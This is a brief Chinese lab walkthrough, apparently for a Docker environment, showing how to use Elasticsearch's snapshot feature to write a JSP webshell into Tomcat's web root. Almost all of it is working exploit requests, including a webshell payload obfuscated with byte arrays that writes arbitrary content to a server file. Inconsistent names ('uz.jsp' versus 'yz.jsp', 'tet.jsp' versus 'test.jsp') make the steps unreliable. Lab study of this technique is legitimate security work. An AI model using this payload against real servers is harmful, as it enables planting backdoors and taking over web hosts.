开启环境：
```
docker compose up -d
```
目的是利用ElasticSearch在`/usr/local/tomcat/webapps`目录下写下WebShell

首先先创建一个恶意的索引文档：
```
POST /yz.jsp/yz.jsp/1 HTTP/1.1

{"<%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]{47,116,101,115,116,46,106,115,112})),new String(new byte[]{114,119})).write(request.getParameter(new String(new byte[]{102})).getBytes());%>":"test"}
```
然后创建一个恶意的仓库
其中`location`的值是我们要写入文件的路径
```
PUT /_snapshot/yz.jsp HTTP/1.1

{
     "type": "fs",
     "settings": {
          "location": "/usr/local/tomcat/webapps/wwwroot/",
          "compress": false
     }
}
```
验证并创建仓库：
```
PUT /_snapshot/uz.jsp/yz.jsp HTTP/1.1

{
     "indices": "yz.jsp",
     "ignore_unavailable": "true",
     "include_global_state": false
}
```
完成后访问：
```
http://localhost:18080/wwwroot/indices/yz.jsp/snapshot-yz.jsp
```
即可找到我们上传的Webshell

这个shell允许向wwwroot目录下的test.jsp文件写入任意字符串
比如：
```
http://localhost:18080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success
```
然后访问：
```
http://localhost:18080/wwwroot/tet.jsp
```
即可看到success
